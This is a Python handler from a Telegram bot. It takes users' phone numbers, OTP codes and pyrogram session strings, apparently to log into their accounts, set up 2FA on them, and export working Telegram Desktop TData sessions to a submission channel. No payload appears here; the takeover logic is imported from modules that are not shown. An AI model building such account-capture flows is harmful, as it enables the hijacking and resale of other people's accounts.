"""Text input handler for phone number and OTP verification - registered via bootstrap registration."""
import asyncio
import logging

from pyrogram import filters
from pyrogram.client import Client
from pyrogram.types import Message

from bot.bootstrap.client import app
from bot.core.parsers import parse_verification_result
from bot.core.pending import _safe_update_pending_session
from bot.handlers import admin as admin_module
from bot.utils.session_handler import (
    get_session_step,
    verify_otp_and_setup_2fa,
    start_session_verification,
)
from bot.utils.bg_tasks import spawn_background

logger = logging.getLogger(__name__)


async def _safe_delete(msg) -> None:
    """Delete a transient "Processing..." message, never raising.

    An unguarded ``processing_msg.delete()`` used to abort this handler when
    Telegram refused the delete (message already gone, MESSAGE_DELETE_FORBIDDEN,
    a FloodWait). The exception unwound into the outer handler, so the user got
    the generic error text and NEVER the "account received" message - even though
    their OTP had already been accepted and the account was being processed.
    """
    if msg is None:
        return
    try:
        await msg.delete()
    except Exception as err:
        logger.debug(f"processing message delete skipped: {err}")


@app.on_message(filters.private & filters.text & ~filters.command(admin_module.NON_TEXT_INPUT_COMMANDS), group=1)
async def handle_text_input(client: Client, message: Message):
    """
    Handle text input for phone number and OTP verification
    Universal guard already enforces channel membership with force_check=True
    """
    processing_msg = None
    try:
        user_id = message.chat.id
        text = message.text.strip()

        # The admin panel handlers (group 0) already consumed this message as
        # admin input. Never re-process it as user verification input.
        if getattr(message, "_handled_by_admin", False):
            return

        from bot.utils.fast_cache import (
            is_user_banned_fast,
            get_cached_template
        )
        from bot.utils.i18n import get_user_lang

        # Guard applies to ALL admins (primary + multi-admin), not just ADMIN_ID.
        # Otherwise an admin's "+880 30" rate input (or any admin panel text)
        # would ALSO start a user verification session on the same message.
        if admin_module.is_admin(user_id):
            # P4-47: a leftover admin_state must never silently eat the
            # admin's phone submission. Reaching THIS handler (group 1, after
            # every group-0 admin input handler) means no group-0 handler
            # consumed the text as admin input. If a pending action is a REAL
            # free-text feature input (search, api add, ...), keep hands off -
            # its handler owns the flow. Any other leftover is a stale panel
            # state (e.g. a view action): clear it and process this text
            # exactly like any user (admin == user).
            pending_state = admin_module.admin_state.get(user_id)
            if pending_state:
                pending_action = str(pending_state.get("action", ""))
                # NOTE: import from the ROUTER module - the admin package's
                # __init__ does not re-export FEATURE_ACTIONS, and a missing
                # attribute here would abort the whole verification flow.
                try:
                    from bot.handlers.admin.router import FEATURE_ACTIONS, _admin_manager
                except ImportError:
                    FEATURE_ACTIONS, _admin_manager = frozenset(), None
                if pending_action in FEATURE_ACTIONS:
                    return
                if _admin_manager is not None:
                    try:
                        _admin_manager.clear_state(user_id)
                    except Exception:
                        pass

            parts = text.split()
            if len(parts) >= 2 and parts[0].startswith('+'):
                try:
                    float(parts[1])
                    return
                except (ValueError, IndexError):
                    pass

        if is_user_banned_fast(user_id):
            await message.reply(get_cached_template("banned_user_message", get_user_lang(user_id)))
            return

        session_step = get_session_step(user_id)

        if session_step == "waiting_otp":
            processing_msg = await message.reply(get_cached_template("processing_message", get_user_lang(user_id)))

            result = await verify_otp_and_setup_2fa(user_id, text, client)
            success, msg, task_session_id = parse_verification_result(result)

            await _safe_delete(processing_msg)
            processing_msg = None
            account_msg = await message.reply(msg)

            if success and task_session_id:
                msg_id = account_msg.id
                spawn_background(_safe_update_pending_session(task_session_id, "user_message_id", msg_id),
                                 "persist-user-message-id")

        elif text.startswith('+'):
            phone_message_id = message.id
            processing_msg = await message.reply(get_cached_template("processing_message", get_user_lang(user_id)))

            result = await start_session_verification(user_id, text, phone_message_id)
            success, msg, task_session_id = parse_verification_result(result)

            await _safe_delete(processing_msg)
            processing_msg = None
            account_msg = await message.reply(msg or "")

            if success and task_session_id:
                msg_id = account_msg.id
                spawn_background(_safe_update_pending_session(task_session_id, "user_message_id", msg_id),
                                 "persist-user-message-id")
        else:
            # Session string submission: if the message is a valid pyrogram
            # session string, generate a working TData directly from it (no
            # OTP / no re-login). This produces the exact tdata that opens in
            # Telegram Desktop without the account being logged out.
            from bot.services.session_formats import parse_pyrogram_session
            session_info = None
            try:
                if text and not text.startswith('+') and len(text) > 60:
                    session_info = parse_pyrogram_session(text)
            except Exception:
                session_info = None

            if session_info:
                processing_msg = await message.reply(
                    get_cached_template("processing_message", get_user_lang(user_id)))
                try:
                    uid = int(session_info.get("user_id") or 0)
                    phone_display = f"user{uid}" if uid else "session"
                    from bot import config as bot_config
                    from bot.services.session_reporting import _build_tdata_report
                    caption = (f"📦 Session String TData\n"
                               f"👤 User ID: `{uid}`\n"
                               f"🌐 DC: `{session_info.get('dc_id')}`\n"
                               f"✅ Generated from submitted session string")
                    sent = await _build_tdata_report(
                        bot_config.get_channel("CHANNEL_SUBMIT"),
                        phone_display, text, "verified_sessions", uid,
                        None, caption,
                    )
                    await _safe_delete(processing_msg)
                    processing_msg = None
                    if sent:
                        await message.reply(
                            "✅ TData generated successfully from your session string!\n"
                            "Check the channel for the file.")
                    else:
                        await message.reply(
                            "❌ TData was generated but could not be delivered. "
                            "Please try again later.")
                except Exception as e:
                    logger.error(f"❌ Session string TData error: {e}")
                    await _safe_delete(processing_msg)
                    processing_msg = None
                    await message.reply(
                        "❌ Failed to generate TData from this session string.")
            else:
                pass
    except Exception as e:
        logger.error(f"❌ Error in handle_text_input: {e}")
        # The "Processing..." bubble must not be left behind forever when the
        # handler dies before its own delete: the user would keep staring at a
        # spinner that never resolves.
        await _safe_delete(processing_msg)
        try:
            from bot.utils.i18n import user_t
            await message.reply(user_t("generic_error_message", message.chat.id))
        except Exception:
            pass  # Reply failed, but error is logged
